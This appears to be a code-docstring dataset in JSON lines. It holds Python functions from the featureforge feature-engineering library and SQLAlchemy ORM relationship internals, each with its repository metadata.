{"docstring": "# This method is here instead of inside setup_database_connection only\n# to make easier to mock MongoDB on tests\n", "func_signal": "def _db_connect(self):\n", "code": "cfg = self._db_config\ndb = MongoClient(cfg['uri'])[cfg['name']]\nreturn db", "path": "featureforge\\experimentation\\stats_manager.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
{"docstring": "\"\"\"\n@feature_name(\"name\")\ndef f(...): ...\n\nAnnotate the name to be used when describing f as a feature. The default\nname when this decorator is used is the function name itself, but you can\ndefine any custom string here if you want to disambiguate or be more\nspecific. The name provided will be used in some reports and error\nmessages.\n\"\"\"\n", "func_signal": "def feature_name(name):\n", "code": "def decorate(f):\n    f._feature_name = name\n    return f\nreturn decorate", "path": "featureforge\\feature.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
{"docstring": "# \"what\" must be a type, like set or tuple\n", "func_signal": "def make_every_list_(self, X, what):\n", "code": "for x in X:\n    xt = []\n    for xi in x:\n        if isinstance(xi, list):\n            xt.append(what(xi))\n        else:\n            xt.append(xi)\n    yield tuple(xt)", "path": "tests\\test_feature_flattener.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
{"docstring": "# The description-feature needs \"description\" on data-point\n", "func_signal": "def test_feature_is_excluded_if_fails_on_firts_M_samples(self):\n", "code": "actual_feature = DescriptionFeature\ndescription_feature = mock.Mock(wraps=actual_feature,\n                                spec=actual_feature)\nself.ev = TolerantFeatureEvaluator([description_feature, DumbFeatureA])\n# We'll use 2 as the first M of test title\nself.ev.FEATURE_STRICT_UNTIL = 2\nsamples = SAMPLES[:]\nsamples.insert(0, {'pk': 33})\nself.apply_fit(samples)\n# Caption was excluded from features list\nself.assertNotIn(description_feature, self.ev.alive_features)\n# Feature was not called anymore after failing, which occurred with the\n# first sample\nself.assertEqual(description_feature.call_count, 1)", "path": "tests\\test_feature_evaluator.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
{"docstring": "# Very similar to fit alone, but buffers samples evaluation for two\n# reasons:\n#   - simply because this is also a transform, so we need to\n#     return that\n#   - to be able to patch them if at some given point a Feature that\n#     was working is killed.\n", "func_signal": "def fit_transform(self, X, y=None):\n", "code": "self._fit_failure_stats = {\n    'discarded_samples': [],\n    'features': defaultdict(list)\n}\nself.alive_features = self.features[:]\nresult = []\n\ndataset = X\n# Caution to not work in strict mode when retrying\nlast_sample_idx = -1\nwhile dataset:\n    self._samples_to_retry = []\n    for i, d in enumerate(dataset, last_sample_idx + 1):\n        r = []\n        for feature in self.alive_features[:]:\n            try:\n                r.append(feature(d))\n            except Exception as e:\n                self.process_failure(result, e, feature, d, i)\n                break\n        else:\n            result.append(r)\n    last_sample_idx = i\n    dataset = self._samples_to_retry\n\nself.alive_features = tuple(self.alive_features)\nself.fitted = True\nreturn (tuple(r) for r in result)", "path": "featureforge\\evaluator.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
{"docstring": "\"\"\"\nBooks the experiment configuration returning the booking_ticket of the\nexperiment if available. None will be returned in any other case.\n\nIf was already booked within BOOKING_DURATION, None will be returned instead,\nassuming that the experiment was booked by someone else that's running it right\nnow.\n\"\"\"\n", "func_signal": "def book_if_available(self, experiment_configuration):\n", "code": "ticket = None\nnow = datetime.now()\ntry:\n    normalized_config, key = self.get_normalized_and_key(experiment_configuration)\nexcept self.normalizer.UnHashableDict as e:\n    logger.critical(\n        \"Couldn't serialize experiment configuration because of %s. \"\n        \"Complete configuration is %s.\" % (e, experiment_configuration)\n    )\n    if self.keep_running_on_errors:\n        # Act as if the experiment had already been booked\n        return None\n    else:\n        raise\nnormalized_config[self.marshalled_key] = key\nnormalized_config[self.experiment_status] = self.STATUS_BOOKED\nnormalized_config[self.booking_at_key] = now\ntry:\n    ticket = self.data.insert(normalized_config)\n    logger.info(\"Created new booking with ticket %s\" % ticket)\nexcept DuplicateKeyError:\n    # Ok, experiment is already registered. Let's see if it was already solved or\n    # not. If not, and if it was booked \"long time ago\", we'll steal the booking\n    # depends on booking_delta value.\n    if self.booking_delta is not None:\n        query = {self.marshalled_key: key,\n                 self.experiment_status: self.STATUS_BOOKED,\n                 self.booking_at_key: {'$lte': now - self.booking_delta}\n                 }\n        update = {'$set': {self.booking_at_key: now}}\n        experiment = self.data.find_and_modify(\n            query, update=update,\n            new=True  # So the modified object is returned\n        )\n        if experiment:\n            logger.info(\"Stolen booking ticket %s\" % key)\n            ticket = experiment[u'_id']\n\nreturn ticket", "path": "featureforge\\experimentation\\stats_manager.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
{"docstring": "# Helper to build schema form the arguments of input_schema & output_schema\n", "func_signal": "def _build_schema(*args, **kwargs):\n", "code": "args = list(args)\nfor i, a in enumerate(args):\n    # Dictionaries are \"softened\"\n    if isinstance(a, dict):\n        args[i] = soft_schema(**a)\nif kwargs:\n    for k, a in kwargs.items():\n        if isinstance(a, dict):\n            args[k] = soft_schema(**a)\n    # if there are kwargs, add an objectschema to the condition\n    args.append(ObjectSchema(**kwargs))\nreturn schema.Schema(schema.And(*args))", "path": "featureforge\\feature.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
{"docstring": "# Check that make_feature builds a usable feature from a bare\n# function\n\n# Build a simple feature that tracks its calls\n", "func_signal": "def test_make_feature_basic(self):\n", "code": "witness = []\ndata = object()\n\ndef simple_feature(data):\n    witness.append(data)\n    return 123\nf = make_feature(simple_feature)\n\n# Check that the feature was built reasonably:\n# * The feature has the right type\nself.assertIsInstance(f, Feature)\n# * The feature takes its name from the function\nself.assertEqual(f.name, \"simple_feature\")\n\n# Try the feature\nresult = f(data)\n\n# Check the result\n# * The feature returned its value\nself.assertEqual(result, 123)\n# * The function was actually called\nself.assertEqual(witness, [data])", "path": "tests\\test_feature.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
{"docstring": "\"\"\"\nCheck that data has all the attributes specified, and validate each\nattribute with the schema provided on construction\n\"\"\"\n", "func_signal": "def validate(self, data):\n", "code": "for a, s in self.attrs.items():\n    s = schema.Schema(s)\n    try:\n        value = getattr(data, a)\n    except AttributeError:\n        raise schema.SchemaError(\" Missing attribute %r\" % a, [])\n    try:\n        new_value = s.validate(value)\n    except schema.SchemaError as e:\n        raise schema.SchemaError(\n            \"Invalid value for attribute %r: %s\" % (a, e), [])\n    setattr(data, a, new_value)\nreturn data", "path": "featureforge\\feature.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
{"docstring": "\"\"\"Validate intput, evaluate, and validate result\"\"\"\n", "func_signal": "def __call__(self, data_point):\n", "code": "try:\n    data_point = self.input_schema.validate(data_point)\nexcept schema.SchemaError as e:\n    raise self.InputValueError(e)\nresult = self._evaluate(data_point)\ntry:\n    return self.output_schema.validate(result)\nexcept schema.SchemaError as e:\n    raise self.OutputValueError(e)", "path": "featureforge\\feature.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
{"docstring": "\"\"\"\nParse repo information, return a summary formatted like\n\"hash [branch] extra\"\n\nWhere extra informs if there are local changes in some files\n\"\"\"\n", "func_signal": "def get_git_info(repo_path):\n", "code": "cwd = os.getcwd()\ntry:\n    # Switch to a dir where the repo is\n    os.chdir(repo_path)\n    # Get data\n    head_hash = os.popen(\"git show-ref --head HEAD\").read().split()[0]\n    current_branch = os.popen(\"git symbolic-ref HEAD\").read().strip()\n    if current_branch.startswith(\"refs/heads/\"):\n        current_branch = current_branch[len(\"refs/heads/\"):]\n    changes = os.popen(\"git diff-index --name-only HEAD\").read().split('\\n')\n    changes = filter(None, changes)  # Remove empty lines\n    if changes:\n        changelist = \" local changes in \" + \", \".join(changes)\n    else:\n        changelist = \"\"\n    return \"%s [%s]%s\" % (head_hash[:10], current_branch, changelist)\nfinally:\n    # Always recover original running directory, just in case\n    os.chdir(cwd)", "path": "featureforge\\experimentation\\utils.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
{"docstring": "\"\"\"\n@output_schema(s1, s2, ..., attr1=as1, attr2=as2, ...)\ndef f(data_point): ...\n\nAnnotate the schema for validating the result of f.\n\ns1, s2, ... are anything that allows building a schema, and are considered\nas conditions to \"and\" with each other (i.e., to validate, all s1, s2, ...\nmust validate). If keyword arguments are specified, the keyword names must\nbe attributes of the result, and the value of each of those attributes\nis validated with the corresponding schema (i.e., as1 is used to validate\nf(data_point).attr1, etc.)\n\nIf any of the schemas used is a dictionary, the semantics of that schema\nis modified to allow additional keys besides the ones specified explicitly\n\"\"\"\n", "func_signal": "def output_schema(*args, **kwargs):\n", "code": "def decorate(f):\n    f._output_schema = _build_schema(*args, **kwargs)\n    return f\nreturn decorate", "path": "featureforge\\feature.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
{"docstring": "\"\"\"\n@input_schema(s1, s2, ..., attr1=as1, attr2=as2, ...)\ndef f(data_point): ...\n\nAnnotate the schema for validating the data_point that f receives.\n\ns1, s2, ... are anything that allows building a schema, and are considered\nas conditions to \"and\" with each other (i.e., to validate, all s1, s2, ...\nmust validate). If keyword arguments are specified, the keyword names must\nbe attributes of the data points, and the value of each of those attributes\nis validated with the corresponding schema (i.e., as1 is used to validate\ndata_point.attr1, etc.)\n\nIf any of the schemas used is a dictionary, the semantics of that schema\nis modified to allow additional keys besides the ones specified explicitly\n\"\"\"\n", "func_signal": "def input_schema(*args, **kwargs):\n", "code": "def decorate(f):\n    f._input_schema = _build_schema(*args, **kwargs)\n    return f\nreturn decorate", "path": "featureforge\\feature.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
{"docstring": "\"\"\"\nGenerates tries data points for the feature (which should have an\ninput schema which allows generation) randomly, and applies those\nto the feature. It checks that the evaluation proceeds without raising\nexceptions and that it produces valid outputs according to the\noutput schema.\n\"\"\"\n", "func_signal": "def assert_passes_fuzz(self, feature_spec, tries=1000):\n", "code": "feature_spec = make_feature(feature_spec)\nfor i in range(tries):\n    data_point = generate.generate(feature_spec.input_schema)\n    try:\n        feature = feature_spec(data_point)\n    except Exception as e:\n        self.fail(\"Error evaluating; input=%r error=%r\" %\n                  (data_point, e))\n    try:\n        feature_spec.output_schema.validate(feature)\n    except schema.SchemaError:\n        self.fail(\"Invalid output schema; input=%r output=%r\" %\n                  (data_point, feature))", "path": "featureforge\\validate.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
{"docstring": "# This means: if a Feature evaluated fine for some samples until it was\n# excluded, once we decided to exclude it, we must make sure that\n# previous samples for which this feature was evaluated, are now\n# striped out of those evaluations\n", "func_signal": "def test_if_a_feature_is_excluded_all_results_doesnt_include_it(self):\n", "code": "self.ev = TolerantFeatureEvaluator([DescriptionFeature, DumbFeatureA])\nself.ev.FEATURE_STRICT_UNTIL = 0\nself.ev.FEATURE_MAX_ERRORS_ALLOWED = 0  # No feature failure tolerated\nresult = self.ev.fit_transform(SAMPLES + [{'nodescription': u'tada!'}])\n# Check that there are results. Otherwise, next loop is dumb\nself.assertTrue(result)\nfor r in result:\n    self.assertEqual(len(r), 1)  # only one value per sample\n    self.assertEqual(r[0], 'a')  # Remember DumbFeatureA returns 'a'", "path": "tests\\test_feature_evaluator.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
{"docstring": "# Upgrade `features` to `Feature` instances.\n", "func_signal": "def __init__(self, features, tolerant=False, sparse=True):\n", "code": "features = list(map(make_feature, features))\nif tolerant:\n    self.evaluator = TolerantFeatureEvaluator(features)\nelse:\n    self.evaluator = FeatureEvaluator(features)\nself.flattener = FeatureMappingFlattener(sparse=sparse)", "path": "featureforge\\vectorizer.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
{"docstring": "\"\"\"\nGiven a column index in the vectorizer's output matrix it returns the\nfeature that originates that column.\n\nThe return value is a tuple (feature, value).\n`feature` is the feature given in the initialization and `value`\ndepends on the kind of feature that the column represents:\n    - If the feature spawns numbers then `value` is `None` and should\n      be ignored.\n    - If the feature spawns strings then `value` is the string that\n      corresponds to the one-hot encoding of that column.\n    - If the feature spawns an array then `value` is the index within\n      the spawned array that corresponds to that column.\n\"\"\"\n", "func_signal": "def column_to_feature(self, i):\n", "code": "j, value = self.flattener.reverse[i]\nfeature = self.evaluator.alive_features[j]\nreturn feature, value", "path": "featureforge\\vectorizer.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
{"docstring": "\"\"\"\nGiven a function f: data point -> feature that computes a feature, upgrade\nit to a feature instance.\nReturns f if f is already a Feature instance\n\"\"\"\n", "func_signal": "def make_feature(f):\n", "code": "if not callable(f):\n    raise TypeError(\"f must be callable\")\nif isinstance(f, Feature):\n    return f\nresult = Feature()\nresult._evaluate = f\nresult._name = getattr(f, \"_feature_name\", f.__name__)\ninput_schema = getattr(f, \"_input_schema\", None)\noutput_schema = getattr(f, \"_output_schema\", None)\nif input_schema is not None:\n    result.input_schema = input_schema\nif output_schema is not None:\n    result.output_schema = output_schema\nreturn result", "path": "featureforge\\feature.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
{"docstring": "# First is for people, later for strings... That's not good.\n", "func_signal": "def test_fit_fails_when_the_successive_bags_are_of_different_type(self):\n", "code": "X = [(PEOPLE[:2], ),\n     ([u'four', u'two', u'four'], )\n     ]\nself.check_fit_fails(X)\n# Even if the initial row is empty, when finally discovered the type,\n# is checked\nX.insert(0, ([], ))\nself.check_fit_fails(X)", "path": "tests\\test_feature_flattener.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
{"docstring": "\"\"\"annotate 'remote' in primaryjoin, secondaryjoin\nwhen the relationship is detected as self-referential.\n\n\"\"\"\n", "func_signal": "def _annotate_selfref(self, fn, remote_side_given):\n", "code": "def visit_binary(binary):\n    equated = binary.left.compare(binary.right)\n    if isinstance(binary.left, expression.ColumnClause) and \\\n            isinstance(binary.right, expression.ColumnClause):\n        # assume one to many - FKs are \"remote\"\n        if fn(binary.left):\n            binary.left = binary.left._annotate({\"remote\": True})\n        if fn(binary.right) and not equated:\n            binary.right = binary.right._annotate(\n                {\"remote\": True})\n    elif not remote_side_given:\n        self._warn_non_column_elements()\n\nself.primaryjoin = visitors.cloned_traverse(\n    self.primaryjoin, {},\n    {\"binary\": visit_binary})", "path": "sqlalchemy\\orm\\relationships.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
{"docstring": "\"\"\"annotate 'remote' in primaryjoin, secondaryjoin\nwhen the parent/child tables have some set of\ntables in common, though is not a fully self-referential\nrelationship.\n\n\"\"\"\n", "func_signal": "def _annotate_remote_with_overlap(self):\n", "code": "def visit_binary(binary):\n    binary.left, binary.right = proc_left_right(binary.left,\n                                                binary.right)\n    binary.right, binary.left = proc_left_right(binary.right,\n                                                binary.left)\n\ndef proc_left_right(left, right):\n    if isinstance(left, expression.ColumnClause) and \\\n            isinstance(right, expression.ColumnClause):\n        if self.child_selectable.c.contains_column(right) and \\\n                self.parent_selectable.c.contains_column(left):\n            right = right._annotate({\"remote\": True})\n    else:\n        self._warn_non_column_elements()\n\n    return left, right\n\nself.primaryjoin = visitors.cloned_traverse(\n    self.primaryjoin, {},\n    {\"binary\": visit_binary})", "path": "sqlalchemy\\orm\\relationships.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
{"docstring": "\"\"\"Determine the 'primaryjoin' and 'secondaryjoin' attributes,\nif not passed to the constructor already.\n\nThis is based on analysis of the foreign key relationships\nbetween the parent and target mapped selectables.\n\n\"\"\"\n", "func_signal": "def _determine_joins(self):\n", "code": "if self.secondaryjoin is not None and self.secondary is None:\n    raise sa_exc.ArgumentError(\n        \"Property %s specified with secondary \"\n        \"join condition but \"\n        \"no secondary argument\" % self.prop)\n\n# find a join between the given mapper's mapped table and\n# the given table. will try the mapper's local table first\n# for more specificity, then if not found will try the more\n# general mapped table, which in the case of inheritance is\n# a join.\ntry:\n    consider_as_foreign_keys = self.consider_as_foreign_keys or None\n    if self.secondary is not None:\n        if self.secondaryjoin is None:\n            self.secondaryjoin = \\\n                join_condition(\n                    self.child_selectable,\n                    self.secondary,\n                    a_subset=self.child_local_selectable,\n                    consider_as_foreign_keys=consider_as_foreign_keys\n                )\n        if self.primaryjoin is None:\n            self.primaryjoin = \\\n                join_condition(\n                    self.parent_selectable,\n                    self.secondary,\n                    a_subset=self.parent_local_selectable,\n                    consider_as_foreign_keys=consider_as_foreign_keys\n                )\n    else:\n        if self.primaryjoin is None:\n            self.primaryjoin = \\\n                join_condition(\n                    self.parent_selectable,\n                    self.child_selectable,\n                    a_subset=self.parent_local_selectable,\n                    consider_as_foreign_keys=consider_as_foreign_keys\n                )\nexcept sa_exc.NoForeignKeysError:\n    if self.secondary is not None:\n        raise sa_exc.NoForeignKeysError(\n            \"Could not determine join \"\n            \"condition between parent/child tables on \"\n            \"relationship %s - there are no foreign keys \"\n            \"linking these tables via secondary table '%s'.  \"\n            \"Ensure that referencing columns are associated \"\n            \"with a ForeignKey or ForeignKeyConstraint, or \"\n            \"specify 'primaryjoin' and 'secondaryjoin' \"\n            \"expressions.\" % (self.prop, self.secondary))\n    else:\n        raise sa_exc.NoForeignKeysError(\n            \"Could not determine join \"\n            \"condition between parent/child tables on \"\n            \"relationship %s - there are no foreign keys \"\n            \"linking these tables.  \"\n            \"Ensure that referencing columns are associated \"\n            \"with a ForeignKey or ForeignKeyConstraint, or \"\n            \"specify a 'primaryjoin' expression.\" % self.prop)\nexcept sa_exc.AmbiguousForeignKeysError:\n    if self.secondary is not None:\n        raise sa_exc.AmbiguousForeignKeysError(\n            \"Could not determine join \"\n            \"condition between parent/child tables on \"\n            \"relationship %s - there are multiple foreign key \"\n            \"paths linking the tables via secondary table '%s'.  \"\n            \"Specify the 'foreign_keys' \"\n            \"argument, providing a list of those columns which \"\n            \"should be counted as containing a foreign key \"\n            \"reference from the secondary table to each of the \"\n            \"parent and child tables.\"\n            % (self.prop, self.secondary))\n    else:\n        raise sa_exc.AmbiguousForeignKeysError(\n            \"Could not determine join \"\n            \"condition between parent/child tables on \"\n            \"relationship %s - there are multiple foreign key \"\n            \"paths linking the tables.  Specify the \"\n            \"'foreign_keys' argument, providing a list of those \"\n            \"columns which should be counted as containing a \"\n            \"foreign key reference to the parent table.\"\n            % self.prop)", "path": "sqlalchemy\\orm\\relationships.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
{"docstring": "\"\"\"Check the foreign key columns collected and emit error\nmessages.\"\"\"\n\n", "func_signal": "def _check_foreign_cols(self, join_condition, primary):\n", "code": "can_sync = False\n\nforeign_cols = self._gather_columns_with_annotation(\n    join_condition, \"foreign\")\n\nhas_foreign = bool(foreign_cols)\n\nif primary:\n    can_sync = bool(self.synchronize_pairs)\nelse:\n    can_sync = bool(self.secondary_synchronize_pairs)\n\nif self.support_sync and can_sync or \\\n        (not self.support_sync and has_foreign):\n    return\n\n# from here below is just determining the best error message\n# to report.  Check for a join condition using any operator\n# (not just ==), perhaps they need to turn on \"viewonly=True\".\nif self.support_sync and has_foreign and not can_sync:\n    err = \"Could not locate any simple equality expressions \"\\\n        \"involving locally mapped foreign key columns for \"\\\n        \"%s join condition \"\\\n        \"'%s' on relationship %s.\" % (\n            primary and 'primary' or 'secondary',\n            join_condition,\n            self.prop\n        )\n    err += \\\n        \"  Ensure that referencing columns are associated \"\\\n        \"with a ForeignKey or ForeignKeyConstraint, or are \"\\\n        \"annotated in the join condition with the foreign() \"\\\n        \"annotation. To allow comparison operators other than \"\\\n        \"'==', the relationship can be marked as viewonly=True.\"\n\n    raise sa_exc.ArgumentError(err)\nelse:\n    err = \"Could not locate any relevant foreign key columns \"\\\n        \"for %s join condition '%s' on relationship %s.\" % (\n            primary and 'primary' or 'secondary',\n            join_condition,\n            self.prop\n        )\n    err += \\\n        '  Ensure that referencing columns are associated '\\\n        'with a ForeignKey or ForeignKeyConstraint, or are '\\\n        'annotated in the join condition with the foreign() '\\\n        'annotation.'\n    raise sa_exc.ArgumentError(err)", "path": "sqlalchemy\\orm\\relationships.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
{"docstring": "# XXX: does the dialect return Decimal or not???\n# if it does (in all cases), we could use a None processor as well as\n# the to_float generic processor\n", "func_signal": "def result_processor(self, dialect, coltype):\n", "code": "if self.asdecimal:\n    def process(value):\n        if isinstance(value, decimal.Decimal):\n            return value\n        else:\n            return decimal.Decimal(str(value))\nelse:\n    def process(value):\n        if isinstance(value, decimal.Decimal):\n            return float(value)\n        else:\n            return value\nreturn process", "path": "sqlalchemy\\dialects\\oracle\\zxjdbc.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
{"docstring": "\"\"\"memoize the 'use_get' attribute of this RelationshipLoader's\nlazyloader.\"\"\"\n\n", "func_signal": "def _use_get(self):\n", "code": "strategy = self._lazy_strategy\nreturn strategy.use_get", "path": "sqlalchemy\\orm\\relationships.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
{"docstring": "\"\"\"Return the targeted :class:`.Mapper` for this\n:class:`.RelationshipProperty`.\n\nThis is a lazy-initializing static attribute.\n\n\"\"\"\n", "func_signal": "def mapper(self):\n", "code": "if util.callable(self.argument) and \\\n        not isinstance(self.argument, (type, mapperlib.Mapper)):\n    argument = self.argument()\nelse:\n    argument = self.argument\n\nif isinstance(argument, type):\n    mapper_ = mapperlib.class_mapper(argument,\n                                     configure=False)\nelif isinstance(self.argument, mapperlib.Mapper):\n    mapper_ = argument\nelse:\n    raise sa_exc.ArgumentError(\n        \"relationship '%s' expects \"\n        \"a class or a mapper argument (received: %s)\"\n        % (self.key, type(argument)))\nreturn mapper_", "path": "sqlalchemy\\orm\\relationships.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
{"docstring": "\"\"\"Produce an expression that tests a collection against\nparticular criterion, using EXISTS.\n\nAn expression like::\n\n    session.query(MyClass).filter(\n        MyClass.somereference.any(SomeRelated.x==2)\n    )\n\n\nWill produce a query like::\n\n    SELECT * FROM my_table WHERE\n    EXISTS (SELECT 1 FROM related WHERE related.my_id=my_table.id\n    AND related.x=2)\n\nBecause :meth:`~.RelationshipProperty.Comparator.any` uses\na correlated subquery, its performance is not nearly as\ngood when compared against large target tables as that of\nusing a join.\n\n:meth:`~.RelationshipProperty.Comparator.any` is particularly\nuseful for testing for empty collections::\n\n    session.query(MyClass).filter(\n        ~MyClass.somereference.any()\n    )\n\nwill produce::\n\n    SELECT * FROM my_table WHERE\n    NOT EXISTS (SELECT 1 FROM related WHERE\n    related.my_id=my_table.id)\n\n:meth:`~.RelationshipProperty.Comparator.any` is only\nvalid for collections, i.e. a :func:`.relationship`\nthat has ``uselist=True``.  For scalar references,\nuse :meth:`~.RelationshipProperty.Comparator.has`.\n\n\"\"\"\n", "func_signal": "def any(self, criterion=None, **kwargs):\n", "code": "if not self.property.uselist:\n    raise sa_exc.InvalidRequestError(\n        \"'any()' not implemented for scalar \"\n        \"attributes. Use has().\"\n    )\n\nreturn self._criterion_exists(criterion, **kwargs)", "path": "sqlalchemy\\orm\\relationships.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
{"docstring": "\"\"\"Return True if parent/child tables have some overlap.\"\"\"\n\n", "func_signal": "def _tables_overlap(self):\n", "code": "return selectables_overlap(\n    self.parent_selectable, self.child_selectable)", "path": "sqlalchemy\\orm\\relationships.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
{"docstring": "\"\"\"annotate 'remote' in primaryjoin, secondaryjoin\nwhen the parent/child tables are entirely\nseparate.\n\n\"\"\"\n", "func_signal": "def _annotate_remote_distinct_selectables(self):\n", "code": "def repl(element):\n    if self.child_selectable.c.contains_column(element) and \\\n            (not self.parent_local_selectable.c.\n                contains_column(element) or\n                self.child_local_selectable.c.\n                contains_column(element)):\n        return element._annotate({\"remote\": True})\nself.primaryjoin = visitors.replacement_traverse(\n    self.primaryjoin, {}, repl)", "path": "sqlalchemy\\orm\\relationships.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
{"docstring": "\"\"\"Annotate the primaryjoin and secondaryjoin\nstructures with 'foreign' annotations marking columns\nconsidered as foreign.\n\n\"\"\"\n", "func_signal": "def _annotate_fks(self):\n", "code": "if self._has_foreign_annotations:\n    return\n\nif self.consider_as_foreign_keys:\n    self._annotate_from_fk_list()\nelse:\n    self._annotate_present_fks()", "path": "sqlalchemy\\orm\\relationships.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
{"docstring": "\"\"\"Use random-ordering sets within the unit of work in order\nto detect unit of work sorting issues.\n\nThis is a utility function that can be used to help reproduce\ninconsistent unit of work sorting issues.   For example,\nif two kinds of objects A and B are being inserted, and\nB has a foreign key reference to A - the A must be inserted first.\nHowever, if there is no relationship between A and B, the unit of work\nwon't know to perform this sorting, and an operation may or may not\nfail, depending on how the ordering works out.   Since Python sets\nand dictionaries have non-deterministic ordering, such an issue may\noccur on some runs and not on others, and in practice it tends to\nhave a great dependence on the state of the interpreter.  This leads\nto so-called \"heisenbugs\" where changing entirely irrelevant aspects\nof the test program still cause the failure behavior to change.\n\nBy calling ``randomize_unitofwork()`` when a script first runs, the\nordering of a key series of sets within the unit of work implementation\nare randomized, so that the script can be minimized down to the\nfundamental mapping and operation that's failing, while still reproducing\nthe issue on at least some runs.\n\nThis utility is also available when running the test suite via the\n``--reversetop`` flag.\n\n.. versionadded:: 0.8.1 created a standalone version of the\n   ``--reversetop`` feature.\n\n\"\"\"\n", "func_signal": "def randomize_unitofwork():\n", "code": "from sqlalchemy.orm import unitofwork, session, mapper, dependency\nfrom sqlalchemy.util import topological\nfrom sqlalchemy.testing.util import RandomSet\ntopological.set = unitofwork.set = session.set = mapper.set = \\\n    dependency.set = RandomSet", "path": "sqlalchemy\\orm\\util.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
{"docstring": "\"\"\"Return True if all columns in the given collection are\nmapped by the tables referenced by this :class:`.Relationship`.\n\n\"\"\"\n", "func_signal": "def _columns_are_mapped(self, *cols):\n", "code": "for c in cols:\n    if self.secondary is not None \\\n            and self.secondary.c.contains_column(c):\n        continue\n    if not self.parent.mapped_table.c.contains_column(c) and \\\n            not self.target.c.contains_column(c):\n        return False\nreturn True", "path": "sqlalchemy\\orm\\relationships.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
{"docstring": "\"\"\" Reconstitute an :class:`.OrderingList`.\n\nThis is the adjoint to :meth:`.OrderingList.__reduce__`.  It is used for\nunpickling :class:`.OrderingList` objects.\n\n\"\"\"\n", "func_signal": "def _reconstitute(cls, dict_, items):\n", "code": "obj = cls.__new__(cls)\nobj.__dict__.update(dict_)\nlist.extend(obj, items)\nreturn obj", "path": "sqlalchemy\\ext\\orderinglist.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
{"docstring": "\"\"\"Produce an IN clause - this is not implemented\nfor :func:`~.orm.relationship`-based attributes at this time.\n\n\"\"\"\n", "func_signal": "def in_(self, other):\n", "code": "raise NotImplementedError('in_() not yet supported for '\n                          'relationships.  For a simple '\n                          'many-to-one, use in_() against '\n                          'the set of foreign key values.')", "path": "sqlalchemy\\orm\\relationships.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
{"docstring": "\"\"\"Produce a construct that represents a particular 'subtype' of\nattribute for the parent class.\n\nCurrently this is usable in conjunction with :meth:`.Query.join`\nand :meth:`.Query.outerjoin`.\n\n\"\"\"\n", "func_signal": "def of_type(self, cls):\n", "code": "return RelationshipProperty.Comparator(\n    self.property,\n    self._parentmapper,\n    adapt_to_entity=self._adapt_to_entity,\n    of_type=cls)", "path": "sqlalchemy\\orm\\relationships.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
{"docstring": "\"\"\"Annotate a portion of a primaryjoin expression\nwith a 'foreign' annotation.\n\nSee the section :ref:`relationship_custom_foreign` for a\ndescription of use.\n\n.. versionadded:: 0.8\n\n.. seealso::\n\n    :ref:`relationship_custom_foreign`\n\n    :func:`.remote`\n\n\"\"\"\n\n", "func_signal": "def foreign(expr):\n", "code": "return _annotate_columns(expression._clause_element_as_expr(expr),\n                         {\"foreign\": True})", "path": "sqlalchemy\\orm\\relationships.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
